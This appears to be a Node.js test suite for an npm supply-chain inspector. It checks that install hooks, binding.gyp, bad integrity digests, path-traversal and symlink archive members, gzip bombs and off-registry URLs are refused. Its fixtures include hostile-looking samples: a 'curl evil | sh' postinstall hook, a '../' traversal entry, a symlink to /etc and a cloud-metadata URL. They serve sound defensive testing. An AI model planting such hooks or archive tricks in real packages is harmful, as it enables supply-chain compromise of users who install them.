// Tests for the T-009 supply-chain inspector (plan §3).
//
// The two fixtures the plan names, each proving a check can FAIL:
//   * a real nested tarball carrying a forbidden hook — a synthetic violations object would
//     prove the predicate, not that fetch-and-unpack actually reaches and reads packages;
//   * a corrupted integrity digest — rejected before unpacking, or verification is decoration.

import { execFileSync, spawnSync } from "node:child_process";
import { mkdtempSync, mkdirSync, writeFileSync, rmSync, chmodSync, readFileSync, symlinkSync, existsSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { createHash } from "node:crypto";
import { gzipSync } from "node:zlib";
import test from "node:test";
import assert from "node:assert/strict";

import {
  lockEntries,
  verifyIntegrity,
  inspectManifest,
  inspectUnpacked,
  inspectClosure,
  scanInstalledTree,
  checkMemberPath,
  measureExpandedBytes,
  validateResolvedUrl,
  FORBIDDEN_SCRIPTS,
  MAX_TARBALL_BYTES,
  MAX_EXPANDED_BYTES,
  SRI_ALGORITHMS,
} from "./supply-chain.mjs";

async function withTempDir(fn) {
  // Async-aware: with a plain `return fn(dir)` the finally would delete the fixture while an
  // async callback is still using it — the callbacks here only survived that by finishing
  // their fixture reads before their first await, which is not a property to lean on.
  const dir = mkdtempSync(join(tmpdir(), "supply-fixture-"));
  chmodSync(dir, 0o700);
  try {
    return await fn(dir);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
}

/** A real gzipped tarball with `package/package.json` (+ optional binding.gyp), built by tar. */
function buildTarball(dir, manifest, { bindingGyp = false } = {}) {
  const stage = join(dir, "stage");
  mkdirSync(join(stage, "package"), { recursive: true });
  writeFileSync(join(stage, "package", "package.json"), JSON.stringify(manifest));
  if (bindingGyp) writeFileSync(join(stage, "package", "binding.gyp"), "{}");
  const out = join(dir, "pkg.tgz");
  const t = spawnSync("tar", ["-czf", out, "-C", stage, "package"], { encoding: "utf8" });
  assert.equal(t.status, 0, t.stderr);
  return readFileSync(out);
}

const integrityOf = (buf) => `sha512-${createHash("sha512").update(buf).digest("base64")}`;

/** A minimal v3 lockfile whose single dependency is served by the injected fetcher. The
 *  resolved URL defaults to the allowlisted registry host because URL validation runs before
 *  the fetcher — including an injected one. */
function buildLockfile(dir, { integrity, resolved } = {}) {
  const p = join(dir, "package-lock.json");
  writeFileSync(
    p,
    JSON.stringify({
      lockfileVersion: 3,
      packages: {
        "": { name: "fixture-workspace" },
        "node_modules/evil-dep": {
          version: "1.0.0",
          resolved: resolved ?? "https://registry.npmjs.org/evil-dep/-/evil-dep-1.0.0.tgz",
          integrity,
        },
      },
    }),
  );
  return p;
}

/**
 * A raw hand-built tar member (512-byte ustar header + padded content), so fixtures can
 * contain entries `tar -czf` refuses to create from a staged directory: traversal paths,
 * absolute paths, symlinks. Portable across bsdtar and GNU tar because it builds bytes, not
 * platform-specific flag invocations.
 */
function tarEntry(name, content = "", { type = "0", linkname = "" } = {}) {
  const header = Buffer.alloc(512);
  header.write(name, 0, 100, "utf8");
  header.write(type === "5" ? "0000755\0" : "0000644\0", 100);
  header.write("0000000\0", 108);
  header.write("0000000\0", 116);
  header.write(Buffer.byteLength(content).toString(8).padStart(11, "0") + "\0", 124);
  header.write("00000000000\0", 136);
  header.fill(" ", 148, 156); // checksum field is spaces while summing
  header[156] = type.charCodeAt(0);
  if (linkname) header.write(linkname, 157, 100, "utf8");
  header.write("ustar", 257);
  header.write("00", 263);
  let sum = 0;
  for (const b of header) sum += b;
  header.write(sum.toString(8).padStart(6, "0") + "\0 ", 148);
  const blocks = [header];
  if (Buffer.byteLength(content) > 0) {
    const data = Buffer.alloc(Math.ceil(Buffer.byteLength(content) / 512) * 512);
    data.write(content);
    blocks.push(data);
  }
  return Buffer.concat(blocks);
}

const rawTarball = (...entries) => gzipSync(Buffer.concat([...entries, Buffer.alloc(1024)]));

test("a fetched tarball carrying a forbidden hook is caught from its real bytes", async () => {
  await withTempDir(async (dir) => {
    const tarball = buildTarball(dir, {
      name: "evil-dep",
      version: "1.0.0",
      scripts: { postinstall: "curl evil | sh" },
    });
    const lock = buildLockfile(dir, { integrity: integrityOf(tarball) });
    const r = await inspectClosure(lock, { fetchTarball: async () => tarball });
    assert.deepEqual(r.violations, [{ package: "evil-dep@1.0.0", kind: "script:postinstall" }]);
  });
});

test("binding.gyp is found in the tarball even when the manifest is silent", async () => {
  // The reason fetch-and-unpack exists at all: binding.gyp is a tarball file, not manifest
  // metadata, so `npm view` and `pack --dry-run` cannot see it.
  await withTempDir(async (dir) => {
    const tarball = buildTarball(dir, { name: "evil-dep", version: "1.0.0" }, { bindingGyp: true });
    const lock = buildLockfile(dir, { integrity: integrityOf(tarball) });
    const r = await inspectClosure(lock, { fetchTarball: async () => tarball });
    assert.deepEqual(r.violations, [{ package: "evil-dep@1.0.0", kind: "binding.gyp" }]);
  });
});

test("a corrupted integrity digest is rejected BEFORE extraction ever runs", async () => {
  // The ordering is the claim (review round 1): an implementation that extracts first and
  // verifies afterward would throw the same error — the injected extraction stage proves the
  // boundary was never crossed.
  await withTempDir(async (dir) => {
    const tarball = buildTarball(dir, { name: "evil-dep", version: "1.0.0" });
    const wrong = integrityOf(Buffer.concat([tarball, Buffer.from([0x00])]));
    const lock = buildLockfile(dir, { integrity: wrong });
    let extractCalls = 0;
    await assert.rejects(
      () =>
        inspectClosure(lock, {
          fetchTarball: async () => tarball,
          extract: () => {
            extractCalls++;
          },
        }),
      /integrity mismatch for evil-dep@1\.0\.0/,
    );
    assert.equal(extractCalls, 0, "extraction was invoked for a tarball that failed verification");
  });
});

test("a lockfile entry without resolved+integrity refuses instead of skipping", async () => {
  await withTempDir((dir) => {
    const p = join(dir, "package-lock.json");
    writeFileSync(
      p,
      JSON.stringify({
        lockfileVersion: 3,
        packages: { "": {}, "node_modules/x": { version: "1.0.0" } },
      }),
    );
    assert.throws(() => lockEntries(p), /cannot verify/);
  });
});

test("an unpacked package with no manifest is a violation, not a skip", async () => {
  await withTempDir((dir) => {
    mkdirSync(join(dir, "package"));
    assert.deepEqual(inspectUnpacked(dir, "x@1"), [{ package: "x@1", kind: "missing-manifest" }]);
  });
});

test("verifyIntegrity distinguishes matching from non-matching bytes", () => {
  const buf = Buffer.from("content");
  assert.equal(verifyIntegrity(buf, integrityOf(buf)), true);
  assert.equal(verifyIntegrity(Buffer.from("tampered"), integrityOf(buf)), false);
  assert.throws(() => verifyIntegrity(buf, "md5-nope"), /unsupported/);
});

test("the real candidate lockfiles resolve, and every entry carries integrity", () => {
  // Non-vacuity against the real workspaces: the closure sizes are the measured facts the
  // decision document reports (v1's stdio-only need pulls a web stack; v2 pulls two packages).
  const HERE = join(process.cwd(), "spikes", "mcp");
  const v1 = lockEntries(join(HERE, "candidates", "v1", "package-lock.json"));
  const v2 = lockEntries(join(HERE, "candidates", "v2", "package-lock.json"));
  assert.ok(v1.length > 50, `v1 closure unexpectedly small: ${v1.length}`);
  assert.ok(v2.length <= 5, `v2 closure unexpectedly large: ${v2.length}`);
  for (const e of [...v1, ...v2]) assert.match(e.integrity, /^sha(512|256|1)-/);
});

test("every forbidden hook name is individually detected", async () => {
  // The list is small; check each member so a future edit dropping one fails here.
  for (const hook of FORBIDDEN_SCRIPTS) {
    await withTempDir((dir) => {
      mkdirSync(join(dir, "package"));
      writeFileSync(
        join(dir, "package", "package.json"),
        JSON.stringify({ name: "h", version: "1.0.0", scripts: { [hook]: "x" } }),
      );
      assert.deepEqual(inspectUnpacked(dir, "h@1"), [{ package: "h@1", kind: `script:${hook}` }]);
    });
  }
});

// --- resolved-URL policy (review round 1) --------------------------------------------------

test("a plain-HTTP resolved URL is refused before any fetch", async () => {
  await withTempDir(async (dir) => {
    const tarball = buildTarball(dir, { name: "evil-dep", version: "1.0.0" });
    const lock = buildLockfile(dir, {
      integrity: integrityOf(tarball),
      resolved: "http://registry.npmjs.org/evil-dep/-/evil-dep-1.0.0.tgz",
    });
    let fetched = 0;
    await assert.rejects(
      () => inspectClosure(lock, { fetchTarball: async () => (fetched++, tarball) }),
      /refusing non-HTTPS/,
    );
    assert.equal(fetched, 0, "a forbidden URL was still fetched");
  });
});

test("a resolved URL on a non-allowlisted host is refused before any fetch", async () => {
  // The attack this closes: a tampered lockfile pointing CI at internal or link-local
  // services. The host allowlist fails closed; loopback and intranet names are not on it.
  for (const resolved of [
    "https://evil.example/evil-dep-1.0.0.tgz",
    "https://127.0.0.1/evil-dep-1.0.0.tgz",
    "https://[::1]/evil-dep-1.0.0.tgz",
    "https://169.254.169.254/latest/meta-data",
  ]) {
    await withTempDir(async (dir) => {
      const tarball = buildTarball(dir, { name: "evil-dep", version: "1.0.0" });
      const lock = buildLockfile(dir, { integrity: integrityOf(tarball), resolved });
      let fetched = 0;
      await assert.rejects(
        () => inspectClosure(lock, { fetchTarball: async () => (fetched++, tarball) }),
        /not an allowlisted registry/,
      );
      assert.equal(fetched, 0, `a forbidden URL was still fetched: ${resolved}`);
    });
  }
});

// --- nested-closure traversal (review round 1) ---------------------------------------------

test("a forbidden hook in a NESTED node_modules lock entry is found, and both levels are fetched", async () => {
  // One top-level entry proves inspection of one package; the plan requires the traversal to
  // reach nested entries too. The hook lives ONLY in the nested dependency.
  await withTempDir(async (dir) => {
    const parentTar = buildTarball(join(dir, "p"), { name: "parent-dep", version: "1.0.0" });
    const nestedTar = buildTarball(join(dir, "n"), {
      name: "evil-nested",
      version: "2.0.0",
      scripts: { postinstall: "curl evil | sh" },
    });
    const byName = { "parent-dep": parentTar, "evil-nested": nestedTar };
    const lock = join(dir, "package-lock.json");
    writeFileSync(
      lock,
      JSON.stringify({
        lockfileVersion: 3,
        packages: {
          "": { name: "fixture-workspace" },
          "node_modules/parent-dep": {
            version: "1.0.0",
            resolved: "https://registry.npmjs.org/parent-dep/-/parent-dep-1.0.0.tgz",
            integrity: integrityOf(parentTar),
          },
          "node_modules/parent-dep/node_modules/evil-nested": {
            version: "2.0.0",
            resolved: "https://registry.npmjs.org/evil-nested/-/evil-nested-2.0.0.tgz",
            integrity: integrityOf(nestedTar),
          },
        },
      }),
    );
    const fetchedNames = [];
    const r = await inspectClosure(lock, {
      fetchTarball: async (url, entry) => {
        fetchedNames.push(entry.name);
        return byName[entry.name];
      },
    });
    assert.deepEqual(fetchedNames.sort(), ["evil-nested", "parent-dep"]);
    assert.deepEqual(r.violations, [{ package: "evil-nested@2.0.0", kind: "script:postinstall" }]);
  });
});

// --- archive-member validation (review round 1) --------------------------------------------

const FIXTURE_MANIFEST = JSON.stringify({ name: "evil-dep", version: "1.0.0" });

test("an archive member that escapes via '..' is refused before extraction writes anything", async () => {
  await withTempDir(async (dir) => {
    const tarball = rawTarball(
      tarEntry("package/package.json", FIXTURE_MANIFEST),
      tarEntry("../escape.txt", "boom"),
    );
    const lock = buildLockfile(dir, { integrity: integrityOf(tarball) });
    await assert.rejects(
      () => inspectClosure(lock, { fetchTarball: async () => tarball }),
      /escapes via '\.\.'/,
    );
  });
});

test("an absolute archive member path is refused", async () => {
  await withTempDir(async (dir) => {
    const tarball = rawTarball(
      tarEntry("package/package.json", FIXTURE_MANIFEST),
      tarEntry("/tmp/absolute.txt", "boom"),
    );
    const lock = buildLockfile(dir, { integrity: integrityOf(tarball) });
    await assert.rejects(() => inspectClosure(lock, { fetchTarball: async () => tarball }), /refused/);
  });
});

test("a symlink archive member is refused — link targets are an escape vector", async () => {
  await withTempDir(async (dir) => {
    const tarball = rawTarball(
      tarEntry("package/package.json", FIXTURE_MANIFEST),
      tarEntry("package/evil-link", "", { type: "2", linkname: "/etc" }),
    );
    const lock = buildLockfile(dir, { integrity: integrityOf(tarball) });
    await assert.rejects(
      () => inspectClosure(lock, { fetchTarball: async () => tarball }),
      /type '.'|linked archive member/,
    );
  });
});

test("an archive member outside package/ is refused", async () => {
  await withTempDir(async (dir) => {
    const tarball = rawTarball(
      tarEntry("package/package.json", FIXTURE_MANIFEST),
      tarEntry("elsewhere/loose.txt", "boom"),
    );
    const lock = buildLockfile(dir, { integrity: integrityOf(tarball) });
    await assert.rejects(
      () => inspectClosure(lock, { fetchTarball: async () => tarball }),
      /outside package\//,
    );
  });
});

test("checkMemberPath accepts normal package members", () => {
  assert.doesNotThrow(() => checkMemberPath("package/package.json", "x"));
  assert.doesNotThrow(() => checkMemberPath("package/dist/index.js", "x"));
  assert.doesNotThrow(() => checkMemberPath("package/", "x"));
});

// --- size bounds (review round 1) ----------------------------------------------------------

test("a tarball over the byte cap is refused even from an injected fetcher", async () => {
  await withTempDir(async (dir) => {
    const huge = Buffer.alloc(MAX_TARBALL_BYTES + 1);
    const lock = buildLockfile(dir, { integrity: integrityOf(huge) });
    await assert.rejects(
      () => inspectClosure(lock, { fetchTarball: async () => huge }),
      /exceeds \d+ bytes/,
    );
  });
});

test("an archive that really expands past the cap is refused before extraction", async () => {
  // Rewritten in review round 2, chunk 13. This used to forge gzip's trailing ISIZE field and
  // assert on the resulting refusal — which proved only that the code read ISIZE, the very
  // thing that made the bound forgeable. The expansion is real now, so the test cannot pass
  // unless something actually measured it.
  await withTempDir(async (dir) => {
    const tarball = gzipSync(Buffer.alloc(MAX_EXPANDED_BYTES + 1024));
    const lock = buildLockfile(dir, { integrity: integrityOf(tarball) });
    let extractCalls = 0;
    await assert.rejects(
      () =>
        inspectClosure(lock, {
          fetchTarball: async () => tarball,
          extract: () => {
            extractCalls++;
          },
        }),
      /expands past \d+ bytes/,
    );
    assert.equal(extractCalls, 0, "the bound must be reached before anything is written to disk");
  });
});

test("a concatenated gzip stream cannot hide its expansion behind a small last member", async () => {
  // The exact evasion the ISIZE check could not see: gzip's trailer describes the LAST member
  // only, so a 5 MB member followed by a 1-byte member reported an expanded size of 1.
  const big = 5_000_000;
  const bomb = Buffer.concat([gzipSync(Buffer.alloc(big, 0x41)), gzipSync(Buffer.from("x"))]);
  assert.equal(bomb.readUInt32LE(bomb.length - 4), 1, "premise: the trailer still reports 1 byte");
  assert.equal(await measureExpandedBytes(bomb, "bomb"), big + 1, "every member must be counted");
});

test("a tarball that is not gzip at all is refused rather than measured as zero", async () => {
  await assert.rejects(() => measureExpandedBytes(Buffer.from("not a gzip stream"), "x"), /not a gzip archive/);
});

test("positive control: a raw-built clean tarball passes member validation and is inspected", async () => {
  // Without this, the rejection tests above could pass because rawTarball's hand-built
  // headers are malformed and EVERYTHING is refused.
  await withTempDir(async (dir) => {
    const tarball = rawTarball(
      tarEntry("package/", "", { type: "5" }),
      tarEntry("package/package.json", FIXTURE_MANIFEST),
    );
    const lock = buildLockfile(dir, { integrity: integrityOf(tarball) });
    const r = await inspectClosure(lock, { fetchTarball: async () => tarball });
    assert.equal(r.verified, 1);
    assert.deepEqual(r.violations, []);
  });
});

// --- the installed-tree rescan (review round 2, chunk 13) -----------------------------------
//
// This function had NO tests, which is how it kept a hole big enough to walk a package through:
// `Dirent.isDirectory()` is false for a symlink, and npm installs `file:`, `link:` and
// workspace dependencies as symlinks. A tree of one honest package plus a symlink to a package
// declaring `postinstall` and `gypfile` reported `{ packagesScanned: 1, violations: [] }` — a
// clean scan of a tree it had not looked at. Every case below is that shape: something a
// reader would call a package, and what the scan says about it.

/** An installed tree: `entries` maps a node_modules-relative path to a manifest, a marker or null. */
function buildTree(dir, entries) {
  const ws = join(dir, "ws");
  mkdirSync(join(ws, "node_modules"), { recursive: true });
  for (const [rel, value] of Object.entries(entries)) {
    const target = join(ws, "node_modules", rel);
    mkdirSync(target, { recursive: true });
    if (value === null) continue; // a directory in package position with no manifest
    if (typeof value === "string") writeFileSync(join(target, "package.json"), value);
    else writeFileSync(join(target, "package.json"), JSON.stringify(value));
  }
  return ws;
}

const CLEAN = { name: "clean", version: "1.0.0" };

test("a symlinked package is recorded, never silently skipped", async () => {
  await withTempDir((dir) => {
    const ws = buildTree(dir, { good: CLEAN });
    // The package an attacker would deliver: everything the scan is looking for, out of tree.
    const outside = join(dir, "outside", "evil");
    mkdirSync(outside, { recursive: true });
    writeFileSync(
      join(outside, "package.json"),
      JSON.stringify({ name: "evil", version: "1.0.0", scripts: { postinstall: "curl evil | sh" }, gypfile: true }),
    );
    symlinkSync(outside, join(ws, "node_modules", "evil"));

    const r = scanInstalledTree(ws);
    assert.equal(r.packagesScanned, 1, "the symlink is not a package this scan can vouch for");
    assert.deepEqual(r.violations, [{ package: "node_modules/evil", kind: "symlinked-package" }]);
  });
});

test("a hidden directory in a package position is recorded; npm's own metadata is not", async () => {
  await withTempDir((dir) => {
    const ws = buildTree(dir, { good: CLEAN, ".bin": null, ".hidden-pkg": CLEAN });
    const r = scanInstalledTree(ws);
    assert.deepEqual(r.violations, [{ package: "node_modules/.hidden-pkg", kind: "hidden-entry" }]);
    assert.equal(r.packagesScanned, 1, "a hidden entry is refused, not scanned");
  });
});

test("a directory in a package position with no manifest is a violation", async () => {
  await withTempDir((dir) => {
    // Node still resolves `require('orphan/file.js')` out of it, so "no manifest" is not "no risk".
    const ws = buildTree(dir, { good: CLEAN, orphan: null });
    const r = scanInstalledTree(ws);
    assert.deepEqual(r.violations, [{ package: "node_modules/orphan", kind: "missing-manifest" }]);
  });
});

test("a malformed manifest is a violation naming its package, not an exception", async () => {
  await withTempDir((dir) => {
    const ws = buildTree(dir, { good: CLEAN, broken: "{ not json" });
    const r = scanInstalledTree(ws);
    assert.equal(r.violations.length, 1);
    assert.equal(r.violations[0].kind, "malformed-manifest");
    assert.equal(r.violations[0].package, "node_modules/broken/package.json");
  });
});

test("the rescan still finds hooks in nested and scoped packages", async () => {
  await withTempDir((dir) => {
    const ws = buildTree(dir, {
      good: CLEAN,
      "@scope/inner": { name: "inner", version: "1.0.0", scripts: { install: "node-gyp rebuild" } },
      "outer/node_modules/deep": { name: "deep", version: "1.0.0", gypfile: true },
    });
    mkdirSync(join(ws, "node_modules", "outer"), { recursive: true });
    writeFileSync(join(ws, "node_modules", "outer", "package.json"), JSON.stringify(CLEAN));
    const kinds = scanInstalledTree(ws).violations.map((v) => v.kind).sort();
    assert.deepEqual(kinds, ["gypfile-flag", "script:install"]);
  });
});

test("positive control: the real installed candidate trees scan clean", (t) => {
  // Non-vacuity for every refusal above: they must not fire on a tree npm actually produces.
  // Skipped rather than failed when the workspaces are not installed — a harness that could
  // not run says so.
  const HERE = join(process.cwd(), "spikes", "mcp");
  const installed = ["v1", "v2"].filter((c) => existsSync(join(HERE, "candidates", c, "node_modules")));
  if (installed.length === 0) {
    t.skip("no candidate workspace is installed — run `node spikes/mcp/matrix.mjs` first");
    return;
  }
  for (const candidate of installed) {
    const r = scanInstalledTree(join(HERE, "candidates", candidate));
    assert.ok(r.packagesScanned > 0, `${candidate}: scanned nothing`);
    assert.deepEqual(r.violations, [], `${candidate}: the real tree must be clean`);
  }
});

// --- bundled dependencies inside a tarball (review round 2, chunk 13) -----------------------

test("a dependency bundled inside a tarball is inspected, not just its outer manifest", async () => {
  await withTempDir(async (dir) => {
    const stage = join(dir, "stage");
    mkdirSync(join(stage, "package", "node_modules", "evil"), { recursive: true });
    writeFileSync(join(stage, "package", "package.json"), JSON.stringify(CLEAN));
    writeFileSync(
      join(stage, "package", "node_modules", "evil", "package.json"),
      JSON.stringify({ name: "evil", version: "1.0.0", scripts: { postinstall: "curl evil | sh" } }),
    );
    writeFileSync(join(stage, "package", "node_modules", "evil", "binding.gyp"), "{}");
    execFileSync("tar", ["-czf", join(dir, "pkg.tgz"), "-C", stage, "package"]);
    const tarball = readFileSync(join(dir, "pkg.tgz"));
    const lock = buildLockfile(dir, { integrity: integrityOf(tarball) });

    const r = await inspectClosure(lock, { fetchTarball: async () => tarball });
    const kinds = r.violations.map((v) => v.kind).sort();
    assert.deepEqual(kinds, ["binding.gyp", "script:postinstall"]);
    for (const v of r.violations) {
      assert.match(v.package, /node_modules\/evil$/, "a nested finding must name where it is");
    }
  });
});

test("a malformed manifest inside a tarball is a violation, not a thrown SyntaxError", async () => {
  await withTempDir((dir) => {
    mkdirSync(join(dir, "package"), { recursive: true });
    writeFileSync(join(dir, "package", "package.json"), "{ not json");
    const v = inspectUnpacked(dir, "x@1");
    assert.deepEqual(v.map((e) => ({ package: e.package, kind: e.kind })), [
      { package: "x@1", kind: "malformed-manifest" },
    ]);
  });
});

test("inspectManifest is the single predicate both inspectors use", async () => {
  await withTempDir((dir) => {
    // If the tarball path and the installed path ever disagree, one of them is not asking the
    // question the other proved. Pinned by construction: both call this.
    const p = join(dir, "package.json");
    writeFileSync(p, JSON.stringify({ name: "x", version: "1", scripts: { preinstall: "x" }, gypfile: 1 }));
    assert.deepEqual(inspectManifest(p, "L"), [
      { package: "L", kind: "script:preinstall" },
      { package: "L", kind: "gypfile-flag" },
    ]);
    writeFileSync(p, "[]");
    assert.equal(inspectManifest(p, "L")[0].kind, "malformed-manifest");
  });
});

// --- integrity parsing (review round 2, chunk 13) -------------------------------------------

test("SHA-1 integrity is refused, whatever else the string carries", () => {
  const buf = Buffer.from("content");
  const sha1 = "sha1-" + createHash("sha1").update(buf).digest("base64");
  assert.throws(() => verifyIntegrity(buf, sha1), /unsupported integrity algorithm/);
  assert.ok(!SRI_ALGORITHMS.includes("sha1"), "sha1 must not be reachable through the allowlist");
});

test("a multi-digest SRI string verifies against its STRONGEST algorithm", () => {
  const buf = Buffer.from("content");
  const sha512 = "sha512-" + createHash("sha512").update(buf).digest("base64");
  const sha256 = "sha256-" + createHash("sha256").update(buf).digest("base64");
  const sha1 = "sha1-" + createHash("sha1").update(buf).digest("base64");
  // Previously `split("-", 2)` read the whole rest of the string as one digest, so this
  // legitimate lockfile value failed as an "integrity mismatch" — a tampering report for a
  // parsing bug.
  assert.equal(verifyIntegrity(buf, `${sha512} ${sha1}`), true);
  assert.equal(verifyIntegrity(buf, `${sha256} ${sha512}`), true);
  // And a weaker digest that DOES match cannot rescue a stronger one that does not.
  const wrong512 = "sha512-" + createHash("sha512").update("other").digest("base64");
  assert.equal(verifyIntegrity(buf, `${wrong512} ${sha1}`), false);
  assert.equal(verifyIntegrity(buf, `${wrong512} ${sha256}`), false);
});

test("unparseable or empty integrity refuses rather than defaulting", () => {
  const buf = Buffer.from("content");
  for (const bad of ["", "   ", "sha512", "sha512-not base64!", "sha512-abc-def"]) {
    assert.throws(() => verifyIntegrity(buf, bad), /integrity/, `accepted ${JSON.stringify(bad)}`);
  }
  assert.throws(() => verifyIntegrity(buf, null), /integrity string is empty/);
});

// --- resolved-URL origin policy (review round 2, chunk 13) ----------------------------------

/** A resolved URL carrying userinfo, built rather than written: a literal `user:pass@host` in
 *  the source reads as an email address to the repository's privacy scanner. */
function withUserinfo(href, username, password) {
  const u = new URL(href);
  u.username = username;
  u.password = password;
  return u.href;
}

test("the resolved URL must name the registry ORIGIN, not merely its hostname", () => {
  for (const [url, why] of [
    ["https://registry.npmjs.org:8443/x/-/x-1.0.0.tgz", /port 8443/],
    [withUserinfo("https://registry.npmjs.org/x/-/x-1.0.0.tgz", "intruder", "secret"), /credentials/],
    ["https://registry.npmjs.org/x/-/x-1.0.0.tgz#frag", /fragment/],
  ]) {
    assert.throws(() => validateResolvedUrl(url, "x"), why, `accepted ${url}`);
  }
  // Positive control: the real shape, with and without the default port spelled out.
  assert.equal(validateResolvedUrl("https://registry.npmjs.org/x/-/x-1.0.0.tgz", "x").hostname, "registry.npmjs.org");
  assert.equal(validateResolvedUrl("https://registry.npmjs.org:443/x/-/x-1.0.0.tgz", "x").port, "");
});

test("the URL that is fetched is the one validation returned, not the lockfile's string", async () => {
  await withTempDir(async (dir) => {
    // The lockfile spells the default port out, so the validated URL and the raw string differ
    // by more than nothing — without that the assertion would hold for a fetcher handed either.
    const tarball = buildTarball(dir, { name: "ok", version: "1.0.0" });
    const raw = "https://registry.npmjs.org:443/ok/-/ok-1.0.0.tgz";
    const lock = buildLockfile(dir, { integrity: integrityOf(tarball), resolved: raw });
    const seen = [];
    await inspectClosure(lock, {
      fetchTarball: async (url) => {
        seen.push(url);
        return tarball;
      },
    });
    assert.deepEqual(seen, ["https://registry.npmjs.org/ok/-/ok-1.0.0.tgz"]);
    assert.notEqual(seen[0], raw, "the raw lockfile string reached the fetcher");
  });
});
